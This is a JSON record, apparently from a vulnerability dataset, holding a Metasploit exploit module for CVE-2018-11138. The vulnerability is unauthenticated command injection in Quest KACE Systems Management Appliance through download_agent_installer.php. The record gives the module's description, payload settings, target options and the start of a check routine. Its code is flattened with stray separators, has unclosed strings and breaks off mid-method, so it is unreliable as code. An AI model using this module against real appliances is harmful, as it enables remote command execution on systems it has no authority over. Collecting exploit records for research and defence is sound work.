{
    "text": "vul_name : Quest KACE Systems Management Command Injection ， vul_cve : CVE-2018-11138 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Quest KACE Systems Management Command Injection' ,  ， 'Description' => %q{ ， This module exploits a command injection vulnerability in Quest KACE ， Systems Management Appliance version 8.0.318 ( and possibly prior ) . ， The `download_agent_installer.php` file allows unauthenticated users ， to execute arbitrary commands as the web server user `www`. ， A valid Organization ID is required. The default value is `1`. ， A valid Windows agent version number must also be provided. If file ， sharing is enabled , the agent versions are available within the ， `\\kace.local\\client\\agent_provisioning\\windows_platform` Samba share. ， Additionally , various agent versions are listed on the KACE website. ， This module has been tested successfully on Quest KACE Systems ， Management Appliance K1000 version 8.0 ( Build 8.0.318 ) . ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Privileged' => false ,  ， 'Platform' => 'unix' ,  # FreeBSD ， 'Arch' => ARCH_CMD ,  ， 'DisclosureDate' => 'May 31 2018' ,  ， 'Author' => ，  [  ， 'Leandro Barragan' ,  # Discovery and PoC ， 'Guido Leo' ,  # Discovery and PoC ， 'Brendan Coles' ,  # Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2018-11138' ]  ,  ，  [ 'URL' , ' ，  [ 'URL' , ' ，  ]  ,  ， 'Payload' => ， { ， 'Space' => 1024 ,  ， 'BadChars' => \"\\x00\\x27\" ,  ， 'DisableNops' => true ,  ， 'Compat' => ， { ， 'PayloadType' => 'cmd' ,  ， 'RequiredCmd' => 'generic perl' ， } ， } ,  ， 'Targets' => [ 'Automatic' , {} ]  ,  ， 'DefaultTarget' => 0 )  ， register_options [  ， OptString.new ( 'SERIAL' ,  [ false , 'Serial number' , ' ]  )  ,  ， OptString.new ( 'ORGANIZATION' ,  [ true , 'Organization ID' , '1' ]  )  ,  ， OptString.new ( 'AGENT_VERSION' ,  [ true , 'Windows agent version' , '8.0.152' ]  )  ，  ]  ， end ， def check ， res = send_request_cgi ( 'uri' => normalize_uri ( 'common' , 'download_agent_installer.php' )  ， unless res ， vprint_error 'Connection failed'",
    "time": "2018.06.27"
}